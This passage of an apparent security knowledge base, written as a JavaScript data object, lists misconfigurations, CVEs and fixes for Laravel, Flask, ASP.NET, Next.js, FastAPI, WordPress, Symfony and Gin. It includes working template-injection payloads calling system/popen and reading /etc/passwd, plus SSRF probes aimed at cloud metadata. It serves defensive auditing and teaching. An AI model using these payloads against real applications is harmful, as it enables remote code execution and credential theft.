        remediation: "Set APP_DEBUG=false in .env for production"
      },
      {
        id: "LARAVEL-MISC-002",
        title: "APP_KEY Exposed or Default",
        severity: "critical",
        description: "The APP_KEY is used for all encryption including session cookies, encrypted fields, and signed URLs. Default or exposed key allows decryption of all encrypted data.",
        impact: "Session hijacking via cookie decryption/forgery, decryption of encrypted database fields, RCE via deserialization of forged cookies",
        detection: "Check .env for default key, search git history for APP_KEY commits",
        remediation: "Run php artisan key:generate. Never commit .env to version control. Rotate key if exposed."
      },
      {
        id: "LARAVEL-MISC-003",
        title: "Unprotected .env File",
        severity: "critical",
        description: "The .env file containing all secrets is accessible via the web server if document root is set to the project root instead of /public.",
        impact: "Complete credential disclosure: database, API keys, mail, AWS, APP_KEY",
        detection: "Request /.env directly: curl https://target.com/.env",
        remediation: "Set document root to /public. Add .env to server deny rules. Verify: location ~ /\\.env { deny all; }"
      },
      {
        id: "LARAVEL-MISC-004",
        title: "Debug Bar in Production",
        severity: "high",
        description: "Laravel Debugbar package left enabled in production, exposing queries, request data, session info, and more.",
        impact: "Database query disclosure, session data exposure, internal application details",
        detection: "Check page source for debugbar assets or check for Debugbar widgets in the bottom of the page",
        remediation: "Set DEBUGBAR_ENABLED=false in production .env. Remove barryvdh/laravel-debugbar from production dependencies."
      },
      {
        id: "LARAVEL-MISC-005",
        title: "Insecure Deserialization via Cookie",
        severity: "critical",
        description: "Laravel encrypts and serializes session/cookie data. If APP_KEY is compromised, an attacker can craft malicious serialized PHP objects (POP chain) for RCE.",
        impact: "Remote code execution via PHP deserialization gadget chains",
        detection: "Requires known APP_KEY. Tools: phpggc for generating Laravel-specific payloads",
        remediation: "Protect APP_KEY. Consider using database sessions instead of cookie sessions. Keep Laravel updated."
      },
      {
        id: "LARAVEL-MISC-006",
        title: "Unrestricted Mass Assignment",
        severity: "high",
        description: "Using Model::create($request->all()) without properly defining $fillable on the model allows setting unintended columns.",
        impact: "Privilege escalation (setting is_admin, role), data manipulation",
        detection: "Send extra parameters in POST/PUT requests that map to sensitive database columns",
        remediation: "Define $fillable whitelist on all models. Never use $request->all() with create/update. Use $request->only(['field1', 'field2'])."
      }
    ],
    templateInjection: {
      engine: "Blade",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "{!! !!}", description: "Unescaped output in Blade templates", risk: "high", example: "{!! $user->bio !!} renders raw HTML" },
        { pattern: "@php @endphp", description: "Arbitrary PHP execution in Blade templates", risk: "critical", example: "@php echo system('id'); @endphp" },
        { pattern: "Blade::render() with user input", description: "Compiling user input as Blade template", risk: "critical", example: "Blade::render($request->input('template'))" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "If user input is compiled as a Blade template (via Blade::render() or similar), arbitrary PHP code execution is possible through @php directives.",
        payload: "@php system('id'); @endphp"
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-29291", title: "SQL Injection in Eloquent", versions: "<10.48.4, <11.1.1", description: "SQL injection via crafted column names in Eloquent queries" },
      { cve: "CVE-2021-43617", title: "Auth bypass via password length", versions: "<8.83.7", description: "Very long passwords cause denial of service or bypass bcrypt's 72-byte limit" },
      { cve: "CVE-2021-3129", title: "Ignition RCE (CVE-2021-3129)", versions: "Ignition <2.5.2", description: "Remote code execution via Ignition error page file manipulation" },
      { cve: "CVE-2020-15169", title: "XSS in Blade x-components", versions: "<7.29.2, <6.20.14", description: "Cross-site scripting via component attributes" },
      { cve: "CVE-2018-15133", title: "RCE via APP_KEY", versions: "<5.6.30", description: "Unserialize RCE when APP_KEY is known" }
    ]
  },

  flask: {
    name: "Flask",
    language: "Python",
    version: "3.x",
    description: "Lightweight WSGI web application framework in Python, designed as a microframework.",
    securityFeatures: [
      { feature: "XSS Protection", default: true, description: "Jinja2 auto-escaping in HTML templates", config: "Jinja2 autoescape=True for .html templates" },
      { feature: "Session Security", default: true, description: "Client-side signed cookies using itsdangerous", config: "SECRET_KEY required" },
      { feature: "CSRF Protection", default: false, description: "No built-in CSRF — requires Flask-WTF", config: "from flask_wtf.csrf import CSRFProtect; CSRFProtect(app)" },
      { feature: "SQL Injection Protection", default: false, description: "No ORM — depends on SQLAlchemy or raw queries", config: "Flask-SQLAlchemy with parameterized queries" },
      { feature: "Rate Limiting", default: false, description: "No built-in rate limiting — requires Flask-Limiter", config: "from flask_limiter import Limiter" },
      { feature: "CORS", default: false, description: "No built-in CORS — requires Flask-CORS", config: "from flask_cors import CORS; CORS(app)" }
    ],
    commonMisconfigs: [
      {
        id: "FLASK-MISC-001",
        title: "Debug Mode in Production",
        severity: "critical",
        description: "Flask debug mode enables the Werkzeug debugger with an interactive Python console accessible to anyone who triggers an error. Also enables the debugger PIN bypass in some versions.",
        impact: "Remote code execution via interactive debugger console, source code disclosure",
        detection: "Trigger an error and check for Werkzeug debugger with interactive console",
        remediation: "Set FLASK_DEBUG=0 or app.run(debug=False) in production. Use FLASK_ENV=production."
      },
      {
        id: "FLASK-MISC-002",
        title: "Weak or Missing SECRET_KEY",
        severity: "critical",
        description: "Flask uses SECRET_KEY to sign session cookies. If it's weak, default, or missing, session cookies can be decoded and forged.",
        impact: "Session hijacking, authentication bypass, privilege escalation",
        detection: "Decode the Flask session cookie (base64) to check if it contains expected data. Use flask-unsign tool to brute-force weak keys.",
        remediation: "Set a strong random SECRET_KEY: import secrets; app.secret_key = secrets.token_hex(32). Store in environment variable."
      },
      {
        id: "FLASK-MISC-003",
        title: "Jinja2 SSTI",
        severity: "critical",
        description: "Server-Side Template Injection when user input is rendered through Jinja2 template engine directly (e.g., render_template_string(user_input)).",
        impact: "Remote code execution, file read, data exfiltration",
        detection: "Input {{7*7}} and check if 49 is returned. Input {{config}} to dump Flask configuration.",
        remediation: "Never pass user input to render_template_string(). Use render_template() with variable substitution."
      },
      {
        id: "FLASK-MISC-004",
        title: "Missing HTTPS Enforcement",
        severity: "medium",
        description: "Flask does not redirect HTTP to HTTPS by default. Session cookies can be intercepted over HTTP.",
        impact: "Session hijacking via network sniffing, credential interception",
        detection: "Access the application over HTTP and check if it redirects to HTTPS",
        remediation: "Use Flask-Talisman: Talisman(app, force_https=True). Set SESSION_COOKIE_SECURE=True."
      }
    ],
    templateInjection: {
      engine: "Jinja2",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "{{ variable|safe }}", description: "Safe filter bypasses auto-escaping", risk: "high", example: "{{ user_input|safe }}" },
        { pattern: "{% autoescape false %}", description: "Disables auto-escaping for block", risk: "critical", example: "{% autoescape false %}{{ user_bio }}{% endautoescape %}" },
        { pattern: "Markup()", description: "Marks string as safe HTML in Python", risk: "high", example: "return Markup(f'<div>{user_input}</div>')" },
        { pattern: "render_template_string()", description: "Renders user input as Jinja2 template", risk: "critical", example: "render_template_string(request.args.get('name'))" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "Jinja2 SSTI is one of the most common web vulnerabilities. When user input reaches render_template_string() or Template(), full Python code execution is achievable.",
        payload: "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read() }}"
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2023-30861", title: "Cookie session data exposure", versions: "<2.3.2, <2.2.5", description: "Session cookie set without Vary: Cookie header, allowing proxy cache poisoning" },
      { cve: "CVE-2019-1010083", title: "DoS via crafted URL", versions: "<1.0", description: "Denial of service via unexpected slash handling in URL routing" },
      { cve: "CVE-2018-1000656", title: "DoS via large JSON", versions: "<0.12.3", description: "Denial of service via JSON payload exceeding memory limits" }
    ]
  },

  aspnet: {
    name: "ASP.NET Core",
    language: "C#",
    version: "8.x",
    description: "Cross-platform, high-performance framework for building modern, cloud-based web applications.",
    securityFeatures: [
      { feature: "Anti-Forgery Tokens", default: true, description: "CSRF protection via [ValidateAntiForgeryToken] attribute", config: "@Html.AntiForgeryToken() in Razor views" },
      { feature: "XSS Protection", default: true, description: "Razor auto-encoding of output", config: "@ syntax in Razor automatically encodes" },
      { feature: "SQL Injection Protection", default: true, description: "Entity Framework Core parameterized queries", config: "EF Core LINQ queries" },
      { feature: "Data Protection API", default: true, description: "Encryption/signing for cookies, tokens, and sensitive data", config: "Microsoft.AspNetCore.DataProtection" },
      { feature: "HTTPS Redirection", default: true, description: "Middleware for HTTPS redirection", config: "app.UseHttpsRedirection()" },
      { feature: "HSTS", default: true, description: "HTTP Strict Transport Security header", config: "app.UseHsts()" },
      { feature: "CORS Policy", default: false, description: "Restrictive by default — must be configured", config: "builder.Services.AddCors()" },
      { feature: "Authentication", default: false, description: "Identity framework with cookie/JWT/OAuth support", config: "builder.Services.AddAuthentication()" }
    ],
    commonMisconfigs: [
      {
        id: "ASPNET-MISC-001",
        title: "Detailed Error Pages in Production",
        severity: "medium",
        description: "Developer Exception Page (app.UseDeveloperExceptionPage()) enabled in production, exposing stack traces, source code, and environment details.",
        impact: "Source code disclosure, internal path exposure, dependency information",
        detection: "Trigger a 500 error and check for ASP.NET developer error page",
        remediation: "Use app.UseDeveloperExceptionPage() only in Development: if (app.Environment.IsDevelopment()) { app.UseDeveloperExceptionPage(); }"
      },
      {
        id: "ASPNET-MISC-002",
        title: "Insecure Deserialization via JsonConverter",
        severity: "critical",
        description: "Using TypeNameHandling.All or TypeNameHandling.Auto in Newtonsoft.Json allows type instantiation from JSON $type property, enabling RCE.",
        impact: "Remote code execution via crafted JSON payloads with malicious type names",
        detection: "Send JSON with $type property: {\"$type\": \"System.IO.FileInfo, System.IO\", \"fileName\": \"/etc/passwd\"}",
        remediation: "Use TypeNameHandling.None (default). If type handling is needed, use a custom SerializationBinder. Prefer System.Text.Json over Newtonsoft.Json."
      },
      {
        id: "ASPNET-MISC-003",
        title: "Exposed Kestrel Server Details",
        severity: "low",
        description: "Kestrel server sends Server: Kestrel header by default, disclosing the web server technology.",
        impact: "Information disclosure for targeted attacks",
        detection: "Check response headers for Server: Kestrel",
        remediation: "options.AddServerHeader = false in Kestrel configuration"
      },
      {
        id: "ASPNET-MISC-004",
        title: "Missing [Authorize] on API Controllers",
        severity: "high",
        description: "API controllers without [Authorize] attribute or authorization policy allow anonymous access to sensitive endpoints.",
        impact: "Unauthorized data access, data manipulation",
        detection: "Send requests to API endpoints without authentication tokens",
        remediation: "Add [Authorize] to controllers/actions. Use builder.Services.AddAuthorization() with policies."
      },
      {
        id: "ASPNET-MISC-005",
        title: "Over-Posting / Mass Assignment",
        severity: "high",
        description: "Binding directly to entity models with [FromBody] Model model allows setting unintended properties.",
        impact: "Privilege escalation, data manipulation",
        detection: "Send extra properties in request body that map to sensitive model fields",
        remediation: "Use DTOs (Data Transfer Objects) for binding. Use [Bind(\"Name,Email\")] attribute. Never bind directly to database entities."
      }
    ],
    templateInjection: {
      engine: "Razor",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "@Html.Raw()", description: "Outputs unencoded HTML in Razor views", risk: "high", example: "@Html.Raw(Model.UserBio)" },
        { pattern: "HtmlString()", description: "Creates a string that bypasses encoding", risk: "high", example: "new HtmlString(userInput)" },
        { pattern: "WriteLiteral()", description: "Writes raw HTML in Razor", risk: "high", example: "WriteLiteral(userContent)" }
      ],
      ssti: {
        vulnerable: false,
        explanation: "Razor views are compiled at build time, not at runtime from user input. SSTI is generally not possible unless the application dynamically compiles Razor templates from user input using RazorEngine or similar libraries."
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-21319", title: "DoS in JWT validation", versions: "Microsoft.IdentityModel <7.1.2", description: "Denial of service via specially crafted JWT tokens" },
      { cve: "CVE-2023-44487", title: "HTTP/2 Rapid Reset DoS", versions: ".NET <8.0.0, <7.0.13, <6.0.24", description: "HTTP/2 rapid reset attack causing denial of service in Kestrel" },
      { cve: "CVE-2023-33170", title: "Rate limiting bypass", versions: ".NET <7.0.9", description: "Security feature bypass in ASP.NET Core rate limiting middleware" },
      { cve: "CVE-2022-34716", title: "Information disclosure in .NET", versions: ".NET <6.0.8", description: "Cryptographic information disclosure via timing side-channel" },
      { cve: "CVE-2019-1302", title: "Privilege escalation in SignalR", versions: "ASP.NET Core SignalR <1.0.4, <1.1.0", description: "Privilege escalation via SignalR connection negotiation" }
    ]
  },

  nextjs: {
    name: "Next.js",
    language: "JavaScript/TypeScript",
    version: "14.x / 15.x",
    description: "React framework for production with server-side rendering, static generation, and API routes.",
    securityFeatures: [
      { feature: "XSS Protection", default: true, description: "React's JSX auto-escapes values by default", config: "React JSX expressions are escaped" },
      { feature: "CSRF Protection", default: false, description: "No built-in CSRF — API routes need manual protection", config: "Implement CSRF tokens manually or use next-csrf" },
      { feature: "Image Optimization", default: true, description: "next/image component prevents image-based XSS and optimizes delivery", config: "next.config.js images configuration" },
      { feature: "Environment Variables", default: true, description: "Server-only env vars (not prefixed with NEXT_PUBLIC_) are never exposed to the client", config: "NEXT_PUBLIC_ prefix exposes to browser" },
      { feature: "Server Actions", default: true, description: "Server-side mutations with automatic encryption of bound values", config: "'use server' directive" },
      { feature: "Headers", default: false, description: "Custom security headers via next.config.js", config: "headers() in next.config.js" }
    ],
    commonMisconfigs: [
      {
        id: "NEXTJS-MISC-001",
        title: "Sensitive Data in NEXT_PUBLIC_ Environment Variables",
        severity: "critical",
        description: "Environment variables prefixed with NEXT_PUBLIC_ are bundled into the client-side JavaScript and visible to anyone. Placing API keys, secrets, or database URLs here exposes them.",
        impact: "API key exposure, secret disclosure, database credential leak",
        detection: "View page source or bundle and search for NEXT_PUBLIC_ values",
        remediation: "Only use NEXT_PUBLIC_ for truly public values. Access secrets server-side only via API routes or getServerSideProps."
      },
      {
        id: "NEXTJS-MISC-002",
        title: "Exposed API Routes Without Authentication",
        severity: "high",
        description: "Next.js API routes (pages/api/ or app/api/) are publicly accessible by default without authentication middleware.",
        impact: "Unauthorized API access, data manipulation",
        detection: "Send requests directly to /api/* endpoints without auth headers",
        remediation: "Add authentication checks to every API route. Use middleware.ts for route-level auth."
      },
      {
        id: "NEXTJS-MISC-003",
        title: "Server-Side Data Leakage via Props",
        severity: "high",
        description: "getServerSideProps or server components passing entire database objects to client components, exposing internal fields like hashed passwords or internal IDs.",
        impact: "Sensitive data exposure in page source",
        detection: "View page source and search for __NEXT_DATA__ script tag containing props",
        remediation: "Only return necessary fields from getServerSideProps. Serialize data explicitly. Use select/pick to filter object properties."
      },
      {
        id: "NEXTJS-MISC-004",
        title: "Open Redirect via next/router",
        severity: "medium",
        description: "Using router.push() or router.replace() with user-controlled URLs allows open redirects.",
        impact: "Phishing via redirecting users to attacker-controlled sites after login",
        detection: "Check for redirect parameters: /login?redirect=https://evil.com",
        remediation: "Validate redirect URLs. Only allow relative paths or whitelisted domains."
      },
      {
        id: "NEXTJS-MISC-005",
        title: "Middleware Bypass via _next/ Paths",
        severity: "high",
        description: "Next.js middleware can be bypassed by requesting internal _next/ paths directly in certain versions.",
        impact: "Authentication and authorization bypass",
        detection: "Request /_next/data/<buildId>/protected-page.json directly",
        remediation: "Update Next.js to latest version. Implement auth checks at the API/data layer, not just middleware."
      },
      {
        id: "NEXTJS-MISC-006",
        title: "SSRF via Server Components",
        severity: "high",
        description: "Server Components that fetch URLs based on user input can be exploited for SSRF to access internal services, cloud metadata, or private networks.",
        impact: "Internal service access, cloud credential theft via IMDS, private data exfiltration",
        detection: "Input internal URLs (http://169.254.169.254/, http://localhost:6379/) in parameters that trigger server-side fetches",
        remediation: "Validate and whitelist URLs for server-side fetches. Block private IP ranges and cloud metadata endpoints."
      }
    ],
    templateInjection: {
      engine: "React JSX",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "dangerouslySetInnerHTML", description: "React's escape hatch for raw HTML — XSS if user input is passed", risk: "critical", example: "<div dangerouslySetInnerHTML={{__html: userInput}} />" },
        { pattern: "href='javascript:'", description: "JavaScript URLs in anchor tags bypass React's XSS protection", risk: "high", example: "<a href={userUrl}>Link</a> where userUrl = 'javascript:alert(1)'" },
        { pattern: "src attribute injection", description: "Setting src on script/iframe with user input", risk: "high", example: "<iframe src={userUrl} />" }
      ],
      ssti: {
        vulnerable: false,
        explanation: "React/JSX is compiled at build time. Server-Side Template Injection is not applicable to Next.js unless using a separate template engine."
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2025-29927", title: "Middleware Authorization Bypass", versions: "<15.2.3, <14.2.25", description: "Authorization bypass via x-middleware-subrequest header manipulation" },
      { cve: "CVE-2024-46982", title: "Cache Poisoning DoS", versions: "<14.2.10", description: "Cache poisoning via crafted headers on ISR pages" },
      { cve: "CVE-2024-34351", title: "SSRF via Server Actions", versions: "<14.1.1", description: "Server-Side Request Forgery through Server Actions redirect responses" },
      { cve: "CVE-2024-34350", title: "HTTP response manipulation", versions: "<14.1.1", description: "Response queue inconsistency via crafted HTTP requests" },
      { cve: "CVE-2023-46298", title: "DoS via RSC response", versions: "<13.5.1", description: "Denial of service via crafted React Server Component response" }
    ]
  },

  fastapi: {
    name: "FastAPI",
    language: "Python",
    version: "0.110+",
    description: "Modern, fast Python web framework for building APIs based on standard Python type hints.",
    securityFeatures: [
      { feature: "Input Validation", default: true, description: "Pydantic models validate and serialize all input data", config: "Type hints + Pydantic BaseModel" },
      { feature: "Auto-Documentation", default: true, description: "OpenAPI/Swagger docs auto-generated (can expose API structure)", config: "/docs and /redoc endpoints" },
      { feature: "CORS", default: false, description: "Must be explicitly configured", config: "from fastapi.middleware.cors import CORSMiddleware" },
      { feature: "OAuth2/JWT", default: false, description: "Built-in OAuth2 dependency injection helpers", config: "from fastapi.security import OAuth2PasswordBearer" },
      { feature: "Rate Limiting", default: false, description: "No built-in — use slowapi or similar", config: "pip install slowapi" },
      { feature: "CSRF Protection", default: false, description: "Not needed for API-only apps using JWT, but needed if using cookies for auth", config: "pip install fastapi-csrf-protect" }
    ],
    commonMisconfigs: [
      {
        id: "FASTAPI-MISC-001",
        title: "Swagger/OpenAPI Docs Exposed in Production",
        severity: "medium",
        description: "FastAPI serves interactive API documentation at /docs (Swagger UI) and /redoc by default, exposing all endpoints, parameters, and schemas.",
        impact: "API structure disclosure, endpoint enumeration, authentication requirement discovery",
        detection: "Navigate to /docs or /redoc on the production server",
        remediation: "Disable in production: app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)"
      },
      {
        id: "FASTAPI-MISC-002",
        title: "CORS Allow All Origins",
        severity: "high",
        description: "Setting allow_origins=['*'] with allow_credentials=True",
        impact: "Cross-origin data theft via authenticated requests",
        detection: "Send request with arbitrary Origin header and check ACAO response",
        remediation: "Whitelist specific origins. Set allow_credentials=False when using wildcard origins."
      },
      {
        id: "FASTAPI-MISC-003",
        title: "Missing Dependency Injection for Auth",
        severity: "high",
        description: "API endpoints without Depends() for authentication/authorization checks are publicly accessible.",
        impact: "Unauthorized API access, data manipulation",
        detection: "Send requests to endpoints without Bearer token",
        remediation: "Use Depends(get_current_user) on all protected endpoints. Use APIRouter with default dependencies."
      },
      {
        id: "FASTAPI-MISC-004",
        title: "SQL Injection via Raw Queries",
        severity: "critical",
        description: "Using f-strings or .format() in raw SQL queries with SQLAlchemy or databases library bypasses parameterization.",
        impact: "Full database compromise",
        detection: "Search for f-string SQL: grep -r 'execute(f\"' or 'text(f\"'",
        remediation: "Always use parameterized queries: db.execute(text('SELECT * FROM users WHERE id = :id'), {'id': user_id})"
      }
    ],
    templateInjection: {
      engine: "Jinja2 (if used with templates)",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "Jinja2Templates with user input", description: "If using Jinja2Templates and passing user input to template rendering", risk: "high", example: "templates.TemplateResponse('page.html', {'content': user_input})" }
      ],
      ssti: {
        vulnerable: false,
        explanation: "FastAPI is primarily an API framework. SSTI is only possible if Jinja2Templates is used and user input is passed to template compilation (not rendering)."
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-24762", title: "DoS via multipart form parsing", versions: "python-multipart <0.0.7", description: "Denial of service via specially crafted Content-Type header in multipart form data (affects FastAPI's file upload)" },
      { cve: "CVE-2023-29159", title: "Path traversal in StaticFiles", versions: "starlette <0.27.0", description: "Path traversal vulnerability in Starlette's StaticFiles (used by FastAPI)" }
    ]
  },

  wordpress: {
    name: "WordPress",
    language: "PHP",
    version: "6.x",
    description: "Content management system powering over 40% of the web, with extensive plugin/theme ecosystem.",
    securityFeatures: [
      { feature: "Nonce Verification", default: true, description: "WordPress nonces for CSRF protection", config: "wp_nonce_field(), check_admin_referer()" },
      { feature: "Data Sanitization", default: false, description: "Functions available but must be manually applied", config: "sanitize_text_field(), esc_html(), wp_kses()" },
      { feature: "Prepared Statements", default: false, description: "$wpdb->prepare() available but not enforced", config: "$wpdb->prepare('SELECT * FROM table WHERE id = %d', $id)" },
      { feature: "Role-Based Access", default: true, description: "User roles and capabilities system", config: "current_user_can('edit_posts')" },
      { feature: "Password Hashing", default: true, description: "phpass-based password hashing", config: "wp_hash_password(), wp_check_password()" },
      { feature: "Auto Updates", default: true, description: "Minor security updates applied automatically", config: "WP_AUTO_UPDATE_CORE in wp-config.php" }
    ],
    commonMisconfigs: [
      {
        id: "WP-MISC-001",
        title: "wp-config.php Accessible",
        severity: "critical",
        description: "wp-config.php contains database credentials, auth keys, salts, and debug settings. Accessible if server misconfigured or backup files left (.bak, ~, .old).",
        impact: "Complete credential disclosure, database access",
        detection: "Request /wp-config.php, /wp-config.php.bak, /wp-config.php~, /wp-config.old",
        remediation: "Move wp-config.php above web root. Deny access in .htaccess/nginx config."
      },
      {
        id: "WP-MISC-002",
        title: "WP_DEBUG Enabled in Production",
        severity: "medium",
        description: "WP_DEBUG = true shows PHP errors and warnings to all visitors, potentially exposing internal paths and sensitive information.",
        impact: "Path disclosure, database table names, PHP version exposure",
        detection: "Check for PHP notices/warnings in page source",
        remediation: "Set WP_DEBUG = false in wp-config.php. Use WP_DEBUG_LOG = true with WP_DEBUG_DISPLAY = false to log errors to file only."
      },
      {
        id: "WP-MISC-003",
        title: "XML-RPC Enabled",
        severity: "medium",
        description: "xmlrpc.php allows brute force attacks via system.multicall (trying hundreds of passwords in a single request) and pingback DDoS amplification.",
        impact: "Brute force amplification, DDoS relay, SSRF via pingback",
        detection: "POST to /xmlrpc.php with: <methodCall><methodName>system.listMethods</methodName></methodCall>",
        remediation: "Disable XML-RPC: add_filter('xmlrpc_enabled', '__return_false'). Block in .htaccess or nginx config."
      },
      {
        id: "WP-MISC-004",
        title: "User Enumeration",
        severity: "low",
        description: "WordPress exposes usernames via ?author=1 parameter (redirects to /author/username/) and the REST API (/wp-json/wp/v2/users).",
        impact: "Username discovery for targeted brute force attacks",
        detection: "GET /?author=1, GET /wp-json/wp/v2/users",
        remediation: "Block author archives. Restrict REST API user endpoint. Use security plugin to prevent enumeration."
      },
      {
        id: "WP-MISC-005",
        title: "Vulnerable Plugins/Themes",
        severity: "critical",
        description: "Third-party plugins and themes are the primary attack vector for WordPress sites. Many contain SQL injection, XSS, file upload, and RCE vulnerabilities.",
        impact: "Complete site compromise depending on vulnerability type",
        detection: "Enumerate plugins: /wp-content/plugins/[name]/readme.txt. Use WPScan: wpscan --url target.com --enumerate p",
        remediation: "Keep all plugins/themes updated. Remove unused ones. Use only reputable plugins with regular updates."
      },
      {
        id: "WP-MISC-006",
        title: "Default wp-admin Login Path",
        severity: "low",
        description: "Default /wp-admin/ and /wp-login.php paths are targeted by automated brute force bots.",
        impact: "Brute force attacks on admin credentials",
        detection: "Navigate to /wp-admin/ or /wp-login.php",
        remediation: "Use a plugin to change login URL. Implement rate limiting. Add two-factor authentication."
      }
    ],
    knownCVEPatterns: [
      { cve: "CVE-2023-2982", title: "Authentication Bypass in miniOrange Social Login", versions: "miniOrange <7.6.5", description: "Authentication bypass via social login plugin" },
      { cve: "CVE-2023-28121", title: "Authentication Bypass in WooCommerce Payments", versions: "WooCommerce Payments <5.6.2", description: "Authentication bypass allowing admin account takeover" },
      { cve: "CVE-2022-21661", title: "SQL Injection in WP_Query", versions: "WordPress <5.8.3", description: "SQL injection via WP_Query when using tax_query" },
      { cve: "CVE-2021-29447", title: "XXE in Media Library", versions: "WordPress <5.7.1", description: "Blind XXE via crafted WAV file upload in media library" },
      { cve: "CVE-2021-24145", title: "RCE in Modern Events Calendar", versions: "<5.16.5", description: "Remote code execution via file upload in popular events plugin" }
    ]
  },

  symfony: {
    name: "Symfony",
    language: "PHP",
    version: "7.x",
    description: "Set of reusable PHP components and a web application framework used by many PHP projects including Laravel, Drupal, and others.",
    securityFeatures: [
      { feature: "CSRF Protection", default: true, description: "Form component includes CSRF token generation and validation", config: "{{ csrf_token('authenticate') }}" },
      { feature: "XSS Protection", default: true, description: "Twig auto-escaping enabled by default", config: "{{ variable }} auto-escapes in Twig" },
      { feature: "SQL Injection Protection", default: true, description: "Doctrine ORM with DQL parameterized queries", config: "Doctrine QueryBuilder with parameters" },
      { feature: "Security Component", default: false, description: "Comprehensive authentication/authorization system", config: "symfony/security-bundle" },
      { feature: "Password Hashing", default: true, description: "Auto-migrating password hasher (bcrypt/sodium)", config: "UserPasswordHasherInterface" },
      { feature: "Firewall", default: true, description: "Request-level security with firewall configuration", config: "security.yaml firewalls section" }
    ],
    commonMisconfigs: [
      {
        id: "SYMFONY-MISC-001",
        title: "Debug Mode / Profiler in Production",
        severity: "critical",
        description: "Symfony Web Profiler toolbar and debug mode expose detailed request information, database queries, environment variables, and configuration.",
        impact: "Full application configuration disclosure, database query exposure, credential leaks",
        detection: "Check for /_profiler/ endpoint, look for Symfony toolbar at bottom of page",
        remediation: "Set APP_ENV=prod and APP_DEBUG=0 in .env. Remove web-profiler-bundle from production."
      },
      {
        id: "SYMFONY-MISC-002",
        title: "Exposed .env File",
        severity: "critical",
        description: "Symfony's .env file containing database URLs, API keys, and APP_SECRET accessible via web server.",
        impact: "Complete credential disclosure",
        detection: "Request /.env directly",
        remediation: "Configure web server to deny access to dot files. Set document root to /public."
      },
      {
        id: "SYMFONY-MISC-003",
        title: "Insecure Deserialization",
        severity: "critical",
        description: "Using unserialize() on user-controlled data with Symfony components allows RCE via POP chain gadgets.",
        impact: "Remote code execution via Symfony/gadget chains",
        detection: "Check for unserialize() on user input. Use phpggc for Symfony-specific gadget chains.",
        remediation: "Never unserialize user input. Use JSON for data serialization. Keep Symfony updated to patch gadget chains."
      },
      {
        id: "SYMFONY-MISC-004",
        title: "Weak APP_SECRET",
        severity: "high",
        description: "APP_SECRET is used for CSRF tokens, remember-me cookies, and signed URLs. If weak or default, these can be forged.",
        impact: "CSRF bypass, session forgery, signed URL manipulation",
        detection: "Check .env for default or weak APP_SECRET value",
        remediation: "Generate strong random APP_SECRET. Store in environment variable, not in .env committed to git."
      }
    ],
    templateInjection: {
      engine: "Twig",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "{{ variable|raw }}", description: "Raw filter bypasses auto-escaping", risk: "high", example: "{{ user_bio|raw }}" },
        { pattern: "{% autoescape false %}", description: "Disables escaping for block", risk: "critical", example: "{% autoescape false %}{{ content }}{% endautoescape %}" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "If user input is passed to Twig's createTemplate() or Environment::render() as template code, SSTI is possible.",
        payload: "{{['id']|filter('system')}}\n{{app.request.server.get('DOCUMENT_ROOT')}}\n{{'cat /etc/passwd'|filter('system')}}"
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-50340", title: "Information disclosure in error handler", versions: "symfony/runtime <7.1.7", description: "Sensitive information disclosure through error responses" },
      { cve: "CVE-2023-46734", title: "XSS in Twig", versions: "Twig <3.11.0", description: "Cross-site scripting when using Twig in a non-HTML context without proper escaping strategy" },
      { cve: "CVE-2023-46733", title: "Session fixation in SecurityBundle", versions: "<6.3.8, <5.4.32", description: "Session fixation vulnerability in Symfony SecurityBundle" },
      { cve: "CVE-2022-24894", title: "Session ID exposure via cookie", versions: "<5.4.20, <6.0.20, <6.1.12, <6.2.6", description: "Session cookie sent without proper security attributes" }
    ]
  },

  gin: {
    name: "Gin",
    language: "Go",
    version: "1.9+",
    description: "High-performance HTTP web framework for Go with a martini-like API.",
    securityFeatures: [
      { feature: "XSS Protection", default: true, description: "html/template auto-escapes by default", config: "Go's html/template package" },
      { feature: "JSON Binding Validation", default: false, description: "Struct tag validation with binding tags", config: "binding:\"required\" struct tags with ShouldBind()" },
      { feature: "CORS", default: false, description: "No built-in CORS — use gin-contrib/cors", config: "import github.com/gin-contrib/cors" },
      { feature: "Rate Limiting", default: false, description: "No built-in — use middleware", config: "Custom middleware or ulule/limiter" },
      { feature: "Trusted Proxies", default: true, description: "Trusted proxy configuration for X-Forwarded-For handling", config: "router.SetTrustedProxies([]string{\"192.168.1.0/24\"})" }
    ],
    commonMisconfigs: [
      {
        id: "GIN-MISC-001",
        title: "Debug Mode (gin.DebugMode) in Production",
        severity: "low",
        description: "Gin in debug mode logs all routes and request details to stdout.",
        impact: "Information disclosure via verbose logging",
        detection: "Check for '[GIN-debug]' prefix in server logs",
        remediation: "Set gin.SetMode(gin.ReleaseMode) or GIN_MODE=release environment variable"
      },
      {
        id: "GIN-MISC-002",
        title: "Missing Input Validation",
        severity: "high",
        description: "Not using binding validation tags or not checking ShouldBind() errors allows invalid or malicious input.",
        impact: "Various injection attacks, business logic bypass",
        detection: "Send malformed input and check if it's accepted",
        remediation: "Use struct binding tags: type LoginReq struct { Username string `json:\"username\" binding:\"required,alphanum\"`}"
      },
      {
        id: "GIN-MISC-003",
        title: "Unsafe HTML Template Rendering",
        severity: "high",
        description: "Using text/template instead of html/template for HTML output bypasses Go's auto-escaping.",
        impact: "Cross-site scripting",
        detection: "Search codebase for 'text/template' imports used for HTML rendering",
        remediation: "Always use html/template for HTML output. Use template.HTML() type only for trusted content."
      },
      {
        id: "GIN-MISC-004",
        title: "Untrusted Proxy Headers",
        severity: "medium",
